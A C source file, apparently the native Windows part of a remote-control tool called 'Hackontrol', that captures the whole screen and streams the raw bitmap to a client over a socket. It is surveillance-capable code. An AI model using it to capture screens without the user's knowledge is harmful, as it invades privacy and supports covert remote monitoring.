#include "screenshot.h"
#include "exception.h"

BOOL TakeScreenshot(JNIEnv* const environment, const SOCKET clientSocket) {
	HDC context = GetDC(NULL);
	int width = GetDeviceCaps(context, HORZRES);
	int height = GetDeviceCaps(context, VERTRES);
	HDC memoryContext = CreateCompatibleDC(context);
	HBITMAP bitmap = CreateCompatibleBitmap(context, width, height);
	HBITMAP oldBitmap = SelectObject(memoryContext, bitmap);
	BitBlt(memoryContext, 0, 0, width, height, context, 0, 0, SRCCOPY);
	bitmap = SelectObject(memoryContext, oldBitmap);
	size_t bufferSize = (width * height * 4) + 8;
	BYTE* buffer = LocalAlloc(LMEM_FIXED, bufferSize);
	BOOL returnValue = FALSE;

	if(!buffer) {
		HackontrolThrowWin32Error(environment, L"LocalAlloc");
		goto cleanup;
	}

	BITMAPINFOHEADER header = {sizeof(BITMAPINFOHEADER)};
	header.biWidth = width;
	header.biHeight = height;
	header.biPlanes = 1;
	header.biBitCount = 32;

	if(!GetDIBits(memoryContext, bitmap, 0, height, buffer + 8, (LPBITMAPINFO) &header, DIB_RGB_COLORS)) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"GetDIBits");
		LocalFree(buffer);
		goto cleanup;
	}

	buffer[0] = (width >> 24) & 0xFF;
	buffer[1] = (width >> 16) & 0xFF;
	buffer[2] = (width >> 8) & 0xFF;
	buffer[3] = width & 0xFF;
	buffer[4] = (height >> 24) & 0xFF;
	buffer[5] = (height >> 16) & 0xFF;
	buffer[6] = (height >> 8) & 0xFF;
	buffer[7] = height & 0xFF;

	int status = send(clientSocket, buffer, (int) bufferSize, 0);
	LocalFree(buffer);

	if(status == SOCKET_ERROR) {
		SetLastError(WSAGetLastError());
		HackontrolThrowWin32Error(environment, L"send");
		goto cleanup;
	}

	returnValue = TRUE;
cleanup:
	DeleteObject(bitmap);
	DeleteDC(memoryContext);
	ReleaseDC(NULL, context);
	return returnValue;
}
